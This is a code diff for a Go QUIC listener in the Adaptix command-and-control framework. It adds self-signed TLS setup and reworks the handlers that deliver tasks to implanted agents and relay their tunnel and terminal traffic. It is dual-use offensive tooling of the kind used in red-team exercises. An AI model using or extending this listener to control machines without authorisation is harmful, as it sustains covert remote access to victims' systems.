@@ -5,14 +5,19 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"crypto/rsa"
 	"crypto/tls"
+	"crypto/x509"
+	"crypto/x509/pkix"
 	"encoding/binary"
 	"encoding/hex"
+	"encoding/pem"
 	"errors"
 	"fmt"
 	"io"
-	"net"
+	"math/big"
 	"os"
+	"sync"
 	"time"
 
 	"github.com/quic-go/quic-go"
@@ -29,11 +34,11 @@ type QUICConfig struct {
 }
 
 type QUICConnection struct {
-	stream       quic.Stream
 	session      quic.Connection
 	lastActivity time.Time
 	ctx          context.Context
 	handleCancel context.CancelFunc
+	streamLock   sync.Mutex // 保护并发流访问
 }
 
 type QUIC struct {
@@ -101,18 +106,63 @@ type TermPack struct {
 	Status string `msgpack:"status"`
 }
 
+// GenerateTLSConfig 生成自签名 TLS 证书配置
+func GenerateTLSConfig() *tls.Config {
+	key, err := rsa.GenerateKey(rand.Reader, 2048)
+	if err != nil {
+		panic(err)
+	}
+
+	template := x509.Certificate{
+		SerialNumber: big.NewInt(1),
+		Subject: pkix.Name{
+			Organization: []string{"Adaptix C2"},
+		},
+		NotBefore:             time.Now(),
+		NotAfter:              time.Now().Add(time.Hour * 24 * 365),
+		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
+		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
+		BasicConstraintsValid: true,
+	}
+
+	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &key.PublicKey, key)
+	if err != nil {
+		panic(err)
+	}
+
+	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(key)})
+	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
+
+	tlsCert, err := tls.X509KeyPair(certPEM, keyPEM)
+	if err != nil {
+		panic(err)
+	}
+
+	return &tls.Config{
+		Certificates: []tls.Certificate{tlsCert},
+		NextProtos:   []string{"adaptix-quic"},
+		MinVersion:   tls.VersionTLS12,
+	}
+}
+
 func (handler *QUIC) Start(ts Teamserver) error {
 	address := fmt.Sprintf("%s:%d", handler.Config.HostBind, handler.Config.PortBind)
 
 	fmt.Println("  ", "Started QUIC listener: "+address)
 
-	// 生成自签名证书（用于测试）
+	// 生成自签名证书
 	tlsConfig := GenerateTLSConfig()
 
-	// 配置 QUIC
+	// 配置 QUIC - 参考 Merlin 的配置
 	quicConfig := &quic.Config{
-		MaxIdleTimeout:  time.Until(time.Now().AddDate(0, 42, 0)), // 42 个月超时
+		// MaxIdleTimeout: 30 秒超时，与 Merlin 保持一致
+		MaxIdleTimeout: 30 * time.Second,
+		// KeepAlivePeriod: 30 秒发送 PING 保持连接
 		KeepAlivePeriod: 30 * time.Second,
+		// HandshakeIdleTimeout: 握手超时
+		HandshakeIdleTimeout: 30 * time.Second,
+		// 启用 0-RTT
+		Allow0RTT: true,
 	}
 
 	var err error
@@ -153,7 +203,12 @@ func (handler *QUIC) acceptConnections(ts Teamserver) {
 }
 
 func (handler *QUIC) handleSession(session quic.Connection, ts Teamserver) {
-	defer session.CloseWithError(0, "closing session")
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Printf("Recovered from panic in handleSession: %v\n", r)
+		}
+		session.CloseWithError(0, "closing session")
+	}()
 
 	for {
 		stream, err := session.AcceptStream(context.Background())
@@ -161,65 +216,74 @@ func (handler *QUIC) handleSession(session quic.Connection, ts Teamserver) {
 			return
 		}
 
+		// 为每个流启动独立的 goroutine 处理
 		go handler.handleStream(stream, session, ts)
 	}
 }
 
 func (handler *QUIC) handleStream(stream quic.Stream, session quic.Connection, ts Teamserver) {
-	defer stream.Close()
+	defer func() {
+		if r := recover(); r != nil {
+			fmt.Printf("Recovered from panic in handleStream: %v\n", r)
+		}
+		stream.Close()
+	}()
 
-	var (
-		recvData      []byte
-		decryptedData []byte
-		encKey        []byte
-		err           error
-		initMsg       StartMsg
-	)
+	// 持续处理该流上的多个消息
+	for {
+		var (
+			recvData      []byte
+			decryptedData []byte
+			encKey        []byte
+			err           error
+			initMsg       StartMsg
+		)
 
-	// QUIC 数据包格式：[4字节长度前缀] + [加密数据]
-	lenBuf := make([]byte, 4)
-	_, err = io.ReadFull(stream, lenBuf)
-	if err != nil {
-		return
-	}
+		// 设置读取超时
+		stream.SetReadDeadline(time.Now().Add(60 * time.Second))
 
-	msgLen := binary.BigEndian.Uint32(lenBuf)
-	if msgLen > 10*1024*1024 { // 限制最大 10MB
-		return
-	}
+		// QUIC 数据包格式：[4字节长度前缀] + [加密数据]
+		lenBuf := make([]byte, 4)
+		_, err = io.ReadFull(stream, lenBuf)
+		if err != nil {
+			return
+		}
 
-	recvData = make([]byte, msgLen)
-	_, err = io.ReadFull(stream, recvData)
-	if err != nil {
-		return
-	}
+		msgLen := binary.BigEndian.Uint32(lenBuf)
+		if msgLen > 10*1024*1024 || msgLen == 0 {
+			return
+		}
 
-	encKey, err = hex.DecodeString(handler.Config.EncryptKey)
-	if err != nil {
-		return
-	}
+		recvData = make([]byte, msgLen)
+		_, err = io.ReadFull(stream, recvData)
+		if err != nil {
+			return
+		}
 
-	// 解密数据
-	decryptedData, err = DecryptData(recvData, encKey)
-	if err != nil {
-		return
-	}
+		encKey, err = hex.DecodeString(handler.Config.EncryptKey)
+		if err != nil {
+			return
+		}
 
-	// 尝试解析为 StartMsg（用于 INIT/EXFIL/JOB/TUNNEL/TERMINAL）
-	err = msgpack.Unmarshal(decryptedData, &initMsg)
-	if err == nil && initMsg.Type >= INIT_PACK && initMsg.Type <= TERMINAL_PACK {
-		// 处理特殊连接消息
-		handler.handleStartMsg(initMsg, decryptedData, stream, session, ts)
-		return
-	}
+		decryptedData, err = DecryptData(recvData, encKey)
+		if err != nil {
+			return
+		}
 
-	// 尝试解析为普通 Message（命令响应）
-	var normalMsg Message
-	err = msgpack.Unmarshal(decryptedData, &normalMsg)
-	if err == nil && normalMsg.Type == 1 {
-		// 处理命令响应
-		handler.handleNormalMessage(decryptedData, stream, session, ts)
-		return
+		// 尝试解析为 StartMsg
+		err = msgpack.Unmarshal(decryptedData, &initMsg)
+		if err == nil && initMsg.Type >= INIT_PACK && initMsg.Type <= TERMINAL_PACK {
+			handler.handleStartMsg(initMsg, decryptedData, stream, session, ts)
+			continue
+		}
+
+		// 尝试解析为普通 Message
+		var normalMsg Message
+		err = msgpack.Unmarshal(decryptedData, &normalMsg)
+		if err == nil && normalMsg.Type == 1 {
+			handler.handleNormalMessage(decryptedData, stream, session, ts)
+			continue
+		}
 	}
 }
 
@@ -252,7 +316,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 		}
 
 		connection := QUICConnection{
-			stream:       stream,
 			session:      session,
 			lastActivity: time.Now(),
 		}
@@ -266,7 +329,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 		}
 
 		if sendData != nil && len(sendData) > 0 {
-			// 发送数据（不需要添加长度前缀，sendPacket 会处理）
 			err = handler.sendPacket(stream, sendData)
 			if err != nil {
 				return
@@ -288,7 +350,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 			return
 		}
 
-		// 传递解密后的完整数据而不是加密数据
 		_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
 		_ = ModuleObject.ts.TsAgentSetTick(agentId)
 
@@ -305,13 +366,10 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 			return
 		}
 
-		// 传递解密后的完整数据而不是加密数据
 		_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
 		_ = ModuleObject.ts.TsAgentSetTick(agentId)
 
 	case TUNNEL_PACK:
-		// UDP 不适合实现持久隧道，因为它是无连接协议
-		// 这里简化处理：接收数据并尝试转发，但不建立持久连接
 		var tunPack TunnelPack
 		err := msgpack.Unmarshal(initMsg.Data, &tunPack)
 		if err != nil {
@@ -332,21 +390,17 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 			return
 		}
 
-		// 通知 teamserver 隧道连接已恢复（但 UDP 模式下是单次数据包处理）
 		ts.TsTunnelConnectionResume(agentId, tunPack.ChannelId, false)
 
-		// 尝试向隧道写入数据（如果有的话）
 		if len(decryptedData) > 4 {
 			pr, pw, err := ModuleObject.ts.TsTunnelGetPipe(agentId, tunPack.ChannelId)
 			if err != nil {
 				return
 			}
 
-			// 解密隧道数据
 			blockDec, _ := aes.NewCipher(tunPack.Key)
 			decStream := cipher.NewCTR(blockDec, tunPack.Iv)
 
-			// 跳过消息头部，提取实际隧道数据
 			tunnelData := decryptedData[4:]
 			if len(tunnelData) > 0 {
 				decBuffer := make([]byte, len(tunnelData))
@@ -354,7 +408,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 				_, _ = pw.Write(decBuffer)
 			}
 
-			// 尝试读取响应数据并发送回去（移除了 SetDeadline 调用）
 			readBuffer := make([]byte, 4096)
 			n, err := pr.Read(readBuffer)
 			if err == nil && n > 0 {
@@ -364,10 +417,7 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 				encData := make([]byte, n)
 				encStream.XORKeyStream(encData, readBuffer[:n])
 
-				msgLen := make([]byte, 4)
-				binary.BigEndian.PutUint32(msgLen, uint32(len(encData)))
-				message := append(msgLen, encData...)
-				_ = handler.sendPacket(addr, message)
+				_ = handler.sendPacket(stream, encData)
 			}
 
 			_ = pr.Close()
@@ -375,8 +425,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 		}
 
 	case TERMINAL_PACK:
-		// UDP 不适合实现持久终端，因为它是无连接协议
-		// 这里简化处理：接收数据并尝试转发，但不建立持久连接
 		var termPack TermPack
 		err := msgpack.Unmarshal(initMsg.Data, &termPack)
 		if err != nil {
@@ -395,21 +443,17 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 			return
 		}
 
-		// 通知 teamserver 终端连接已恢复（但 UDP 模式下是单次数据包处理）
 		ts.TsTerminalConnResume(agentId, terminalId, false)
 
-		// 尝试向终端写入数据（如果有的话）
 		if len(decryptedData) > 4 {
 			pr, pw, err := ModuleObject.ts.TsTerminalGetPipe(agentId, terminalId)
 			if err != nil {
 				return
 			}
 
-			// 解密终端数据
 			blockDec, _ := aes.NewCipher(termPack.Key)
 			decStream := cipher.NewCTR(blockDec, termPack.Iv)
 
-			// 跳过消息头部，提取实际终端数据
 			termData := decryptedData[4:]
 			if len(termData) > 0 {
 				decBuffer := make([]byte, len(termData))
@@ -417,7 +461,6 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 				_, _ = pw.Write(decBuffer)
 			}
 
-			// 尝试读取响应数据并发送回去（移除了 SetDeadline 调用）
 			readBuffer := make([]byte, 4096)
 			n, err := pr.Read(readBuffer)
 			if err == nil && n > 0 {
@@ -427,10 +470,7 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 				encData := make([]byte, n)
 				encStream.XORKeyStream(encData, readBuffer[:n])
 
-				msgLen := make([]byte, 4)
-				binary.BigEndian.PutUint32(msgLen, uint32(len(encData)))
-				message := append(msgLen, encData...)
-				_ = handler.sendPacket(addr, message)
+				_ = handler.sendPacket(stream, encData)
 			}
 
 			_ = pr.Close()
@@ -439,95 +479,82 @@ func (handler *QUIC) handleStartMsg(initMsg StartMsg, decryptedData []byte, stre
 	}
 }
 
-func (handler *UDP) handleNormalMessage(decryptedData []byte, addr *net.UDPAddr, ts Teamserver) {
-	// 根据 UDP 地址查找对应的 agentId
+func (handler *QUIC) handleNormalMessage(decryptedData []byte, stream quic.Stream, session quic.Connection, ts Teamserver) {
 	var agentId string
 	var found bool
 
+	// 根据 session 查找对应的 agentId
 	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
-		connection, ok := valueConn.(UDPConnection)
+		connection, ok := valueConn.(QUICConnection)
 		if !ok {
-			return true // 继续遍历
+			return true
 		}
 
-		// 比较 IP 和 Port
-		if connection.addr.IP.Equal(addr.IP) && connection.addr.Port == addr.Port {
+		if connection.session == session {
 			agentId = key
 			found = true
-			return false // 找到了，停止遍历
+			return false
 		}
-		return true // 继续遍历
+		return true
 	})
 
 	if !found {
-		// 未找到对应的 agent 连接
 		return
 	}
 
-	// 处理命令响应数据
 	_ = ModuleObject.ts.TsAgentProcessData(agentId, decryptedData)
 
-	// 更新最后活动时间
 	value, exists := handler.AgentConnects.Get(agentId)
 	if exists {
-		connection, ok := value.(UDPConnection)
+		connection, ok := value.(QUICConnection)
 		if ok {
 			connection.lastActivity = time.Now()
 			handler.AgentConnects.Put(agentId, connection)
 		}
 	}
 
-	// 获取新任务
 	sendData, err := ModuleObject.ts.TsAgentGetHostedTasks(agentId, 0x1900000)
 	if err != nil {
 		return
 	}
 
-	// 如果有新任务，发送给 agent
 	if sendData != nil && len(sendData) > 0 {
-		// 添加长度前缀（agent 使用 RecvMsg 接收）
-		msgLen := make([]byte, 4)
-		binary.BigEndian.PutUint32(msgLen, uint32(len(sendData)))
-		message := append(msgLen, sendData...)
-		err = handler.sendPacket(addr, message)
+		err = handler.sendPacket(stream, sendData)
 		if err != nil {
 			return
 		}
 	}
 
-	// 更新 agent tick
 	_ = ModuleObject.ts.TsAgentSetTick(agentId)
 }
 
-func (handler *UDP) Stop() error {
+func (handler *QUIC) Stop() error {
 	var (
 		err          error = nil
 		listenerPath       = ListenerDataDir + "/" + handler.Name
 	)
 
-	// 首先标记为非活动状态
 	handler.Active = false
 
-	// 关闭停止通道，通知 goroutine 停止
 	if handler.stopChan != nil {
 		close(handler.stopChan)
 	}
 
-	// 关闭 UDP 连接
-	if handler.Conn != nil {
-		_ = handler.Conn.Close()
+	if handler.Listener != nil {
+		_ = handler.Listener.Close()
 	}
 
-	// 取消所有连接的 context
 	handler.AgentConnects.ForEach(func(key string, valueConn interface{}) bool {
-		connection, _ := valueConn.(UDPConnection)
+		connection, _ := valueConn.(QUICConnection)
 		if connection.handleCancel != nil {
 			connection.handleCancel()
+		}
+		if connection.session != nil {
+			connection.session.CloseWithError(0, "listener stopping")
 		}
 		return true
 	})
 
-	// 删除监听器数据目录
 	_, err = os.Stat(listenerPath)
 	if err == nil {
 		err = os.RemoveAll(listenerPath)
@@ -539,13 +566,19 @@ func (handler *UDP) Stop() error {
 	return nil
 }
 
-func (handler *UDP) sendPacket(addr *net.UDPAddr, data []byte) error {
-	if handler.Conn == nil {
-		return errors.New("conn is nil")
+func (handler *QUIC) sendPacket(stream quic.Stream, data []byte) error {
+	if stream == nil {
+		return errors.New("stream is nil")
 	}
 
-	// 直接发送数据（调用者负责添加长度前缀）
-	_, err := handler.Conn.WriteToUDP(data, addr)
+	// 设置写入超时
+	stream.SetWriteDeadline(time.Now().Add(30 * time.Second))
+
+	msgLen := make([]byte, 4)
+	binary.BigEndian.PutUint32(msgLen, uint32(len(data)))
+	message := append(msgLen, data...)
+
+	_, err := stream.Write(message)
 	return err
 }
 
